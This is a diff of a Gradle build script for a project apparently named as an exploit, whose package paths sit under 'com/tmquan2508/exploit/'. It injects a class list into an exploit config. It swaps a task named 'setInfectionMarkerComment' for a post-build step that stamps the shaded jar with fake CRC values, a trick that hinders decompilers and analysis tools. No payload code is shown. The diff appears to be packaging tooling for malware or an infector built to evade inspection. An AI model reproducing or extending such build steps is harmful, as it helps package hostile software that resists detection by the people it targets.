@@ -1,4 +1,5 @@
 import com.tmquan2508.gradle.InjectClassList
+import com.tmquan2508.buildtools.FakeCrcMarker
 
 plugins {
     id 'java'
@@ -55,7 +56,6 @@ processResources {
     }
 }
 
-apply from: 'gradle/comment-task.gradle'
 tasks.register('injectClassList', InjectClassList) {
     dependsOn tasks.named('classes')
     def classesOutput = sourceSets.main.output.classesDirs.singleFile
@@ -64,6 +64,18 @@ tasks.register('injectClassList', InjectClassList) {
     searchPrefix.set("com/tmquan2508/exploit/")
     configClassName.set("com.tmquan2508.exploit.Config")
     placeholder.set("::CLASSLIST::")
+}
+
+task markJarWithFakeCRC {
+    dependsOn shadowJar
+    doLast {
+        def shadowJarTask = tasks.named('shadowJar').get()
+        def shadowJarFile = shadowJarTask.archiveFile.get().asFile
+        if (!shadowJarFile.exists()) {
+            throw new GradleException("Fat jar not found: $shadowJarFile")
+        }
+        FakeCrcMarker.markJarWithFakeCRC(shadowJarFile)
+    }
 }
 
 tasks {
@@ -78,12 +90,12 @@ tasks.named('jar') {
 
 tasks.shadowJar {
     dependsOn(tasks.named('injectClassList'))
-    archiveClassifier.set('')
+    //archiveClassifier.set('')
 }
 
 build {
     dependsOn shadowJar
-    finalizedBy(tasks.named('setInfectionMarkerComment'))
+    finalizedBy(markJarWithFakeCRC)
 }
 
 artifacts {
